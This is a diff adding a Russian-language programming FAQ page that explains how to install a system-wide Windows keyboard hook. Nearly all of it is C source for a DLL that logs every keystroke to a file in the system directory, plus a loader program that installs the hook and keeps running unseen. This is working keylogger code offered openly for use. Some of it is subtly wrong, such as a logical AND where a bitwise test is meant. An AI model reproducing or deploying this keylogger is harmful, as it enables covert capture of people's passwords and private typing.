@@ -1,0 +1,160 @@
+<!--#include virtual="/ssi/top.html"-->
+<div align="center"><center>
+
+<table width="680" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><hr>
+    <h3>Как поставить system-wide хук(например писать в файл
+    все нажатия кнопок)</h3>
+    <p>Для этого хук должен жить в длл.</p>
+    <pre>текст DLL:
+
+BOOL kdown=false;
+HANDLE ghDLLInst = 0;   // Handle to the DLL's instance.
+char logname[MAX_PATH];
+char sysdir[MAX_PATH];
+DWORD NOfBytes;
+BOOL shift=false;
+HANDLE LFile;
+char buffer[20];
+
+BOOL WINAPI DllMain (HANDLE hModule, DWORD dwFunction, LPVOID lpNot)
+{
+    ghDLLInst = hModule;
+
+    switch (dwFunction)
+    {
+        case DLL_PROCESS_ATTACH:
+   {
+
+   GetSystemDirectory(
+      sysdir,
+   MAX_PATH
+   );
+
+   strcpy(logname,sysdir);
+   strcat(logname,&quot;\\kbdkeys.txt&quot;);
+
+   }
+        case DLL_PROCESS_DETACH:
+   {
+   }
+
+        default:
+            break;
+    }
+    return TRUE;
+}
+//------------------------------------------------
+ LRESULT  CALLBACK KeyboardProc(
+     int code,  // hook code
+     WPARAM wParam,     // virtual-key code
+     LPARAM lParam      // keystroke-message information
+   )
+{
+BYTE aa[4];
+memcpy(aa,&amp;lParam,4);
+kdown=!(aa[3]&amp;&amp;64);
+BYTE scancode=aa[2];
+BYTE ww[4];
+memcpy(ww,&amp;wParam,4);
+
+if (code&lt;0)return CallNextHookEx(NULL,code,wParam,lParam);
+
+if(kdown&amp;&amp;(wParam==VK_SHIFT))shift=true;
+
+if(!kdown&amp;&amp;(wParam==VK_SHIFT))shift=false;
+
+if (kdown&amp;&amp;(wParam!=VK_SHIFT))
+{
+sprintf( buffer ,&quot;%c&quot;,wParam );
+if(isalpha(ww[0])&amp;(!shift))wParam=wParam+32;
+sprintf( buffer ,&quot;%c&quot;,wParam );
+if(wParam==VK_RETURN)strcpy(buffer,&quot;\n&quot;);
+
+   LFile=CreateFile(logname, GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE |
+FILE_SHARE_READ |
+FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+  OVERLAPPED ovlp;
+  DWORD ffsze=GetFileSize(LFile,NULL);
+  ovlp.OffsetHigh=0;
+  ovlp.hEvent=NULL;
+   ovlp.Offset=ffsze;
+
+  WriteFile(LFile,buffer,strlen(buffer),&amp;NOfBytes,&amp;ovlp);
+
+  CloseHandle(LFile);
+}
+ return CallNextHookEx(NULL,code,wParam,lParam);
+}
+//----------------------------------------------------------------------//
+текст приложения:
+
+#include &lt;commdlg.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;winnls.h&gt;
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                     LPSTR lpCmdLine, int nCmdShow);
+
+//---------------------------------------------------------------------//
+BOOL
+SetHook(
+    BOOL fSet
+    )
+{
+    static HHOOK hhkKbdHook = NULL;
+    static HANDLE hmodHook;
+
+    if (fSet)
+    {
+        if (!hmodHook)
+        {
+            if (!(hmodHook = LoadLibrary(&quot;kbdh.dll&quot;))) //вышеприведенная длл
+            {
+                return FALSE;
+            }
+        }
+
+        if (!hhkKbdHook)
+        {
+         if (!(hhkKbdHook =
+  SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)
+  GetProcAddress((HINSTANCE)hmodHook,&quot;KeyboardProc&quot;),(HINSTANCE)hmodHook,0)))
+            {
+                return FALSE;
+            }
+        }
+
+ }
+    else
+    {
+        if (hhkKbdHook)
+        {
+            UnhookWindowsHookEx(hhkKbdHook);
+            hhkKbdHook = NULL;
+        }
+
+    }
+
+    return TRUE;
+}
+//--------------------------------------------------------------------//
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                     LPSTR lpCmdLine, int nCmdShow)
+{
+    if(!SetHook(true))MessageBox(NULL,&quot;zad&quot;,&quot;zad&quot;,MB_OK);
+    MSG   msg;
+
+  while (GetMessage (&amp;msg, NULL, 0, 0))
+  {
+        TranslateMessage (&amp;msg);
+        DispatchMessage (&amp;msg);
+  }
+ return( 0 );
+}</pre>
+    <p>&nbsp;</td>
+  </tr>
+</table>
+</center></div>
+<!--#include virtual="/ssi/bottom.html"-->
